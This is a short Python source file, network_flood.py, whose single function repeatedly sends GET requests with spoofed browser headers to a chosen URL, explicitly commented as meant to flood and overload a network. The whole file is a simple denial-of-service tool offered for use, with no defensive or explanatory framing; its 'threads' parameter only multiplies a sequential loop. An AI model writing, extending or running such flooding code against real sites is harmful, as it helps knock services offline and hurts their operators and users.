# network_flood.py

import requests
from rich.console import Console

console = Console()

# Function to send large flood requests to overload the network
def send_network_flood(url, threads, duration):
    console.print(f"[yellow]Flooding network with requests to {url}...[/yellow]")
    for _ in range(threads * duration):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Connection': 'keep-alive',
                'Accept-Encoding': 'gzip, deflate, br',
            }
            response = requests.get(url, headers=headers, timeout=2)
            if response.status_code != 200:
                console.print(f"[red]Failed to send request! Status: {response.status_code}[/red]")
        except requests.exceptions.RequestException as e:
            console.print(f"[red]Request failed: {e}[/red]")
